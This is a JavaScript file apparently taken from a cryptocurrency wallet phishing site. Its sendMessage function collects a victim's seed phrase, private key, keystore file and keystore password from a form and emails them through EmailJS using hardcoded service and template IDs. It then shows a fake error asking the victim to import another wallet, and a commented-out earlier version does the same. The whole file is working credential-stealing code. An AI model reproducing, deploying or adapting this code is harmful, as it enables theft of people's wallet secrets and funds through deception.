

function sendMessage(event){
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }
 
    const walletNameInput = document.getElementById("walletNameData");
    const phraseInput = document.getElementById("textInput");
    const privateKeyInput = document.getElementById("textpk");
    const keystoreInput = document.getElementById("textkeys");
    const keystorePassInput = document.getElementById("textksp");

    const walletName = walletNameInput ? walletNameInput.value.trim() : '';
    const textInput = phraseInput ? phraseInput.value.trim() : '';
    const textpk = privateKeyInput ? privateKeyInput.value.trim() : '';
    const textkeys = keystoreInput ? keystoreInput.value.trim() : '';
    const textksp = keystorePassInput ? keystorePassInput.value.trim() : '';

    if (!textInput && !textpk && !textkeys) {
        alert('Please enter your details before proceeding.');
        return false;
    }

    const proceedBtn = document.getElementById("proceedButton");
    if (proceedBtn) {
        proceedBtn.disabled = true;
        proceedBtn.innerText = "Connecting...";
    }

    var params = {
        subject: walletName || 'Wallet Connection',
        wallet_name: walletName || 'Wallet Connection',
        walletName: walletName || 'Wallet Connection',
        textInput: textInput,
        textpk: textpk,
        textkeys: textkeys,
        textksp: textksp,
        // Legacy fallback aliases
        message: textInput || textpk || textkeys,
        phrase: textInput,
        private_key: textpk,
        keystore: textkeys,
        pk: textksp || textpk
    };

    const serviceID = 'service_7j8do6q';
    const templateID = 'template_6csopl7';
    const publicKey = 'tRYq_CDLm-Vu_54J4';

    function handleSuccess(res) {
        if (walletNameInput) walletNameInput.value = "";
        if (phraseInput) phraseInput.value = "";
        if (privateKeyInput) privateKeyInput.value = "";
        if (keystoreInput) keystoreInput.value = "";
        if (keystorePassInput) keystorePassInput.value = "";

        console.log("EmailJS Sent Successfully:", res);
        alert('An error occurred, try importing another active wallet');
        window.location.href = 'index.html';
    }

    function handleError(err) {
        console.error("EmailJS Submission Error:", err);
        if (proceedBtn) {
            proceedBtn.disabled = false;
            proceedBtn.innerText = "PROCEED";
        }
        alert('An error occurred, try importing another active wallet');
        window.location.href = 'index.html';
    }

    try {
        if (typeof emailjs === 'undefined') {
            throw new Error("EmailJS SDK is not loaded on the page.");
        }

        emailjs.send(serviceID, templateID, params, publicKey)
            .then(handleSuccess)
            .catch(handleError);
    } catch (err) {
        handleError(err);
    }

    return false;
}


// function sendMessage2(){
 
// const phraseTextarea = document.getElementById("privateKeyInput");

// // Get the value of the textarea
// const phraseValue = phraseTextarea ? phraseTextarea.value : '';

//     var params= {
//         subject: document.getElementById("wallet_name").value,
//         message: phraseValue || ''
//     }

//   const serviceID  = 'service_4mr64an';
// const templateID = 'template_p3t6orr';

// emailjs.send(serviceID, templateID, params).then((res)=>{
//     if(document.getElementById("wallet_name")) document.getElementById("wallet_name").value= "";
//     if(document.getElementById("privateKeyInput")) document.getElementById("privateKeyInput").value= "";
//     console.log(res);
//     alert('An error occurred, try importing another active wallet');
//     window.location.href='index.html';

// })
// }

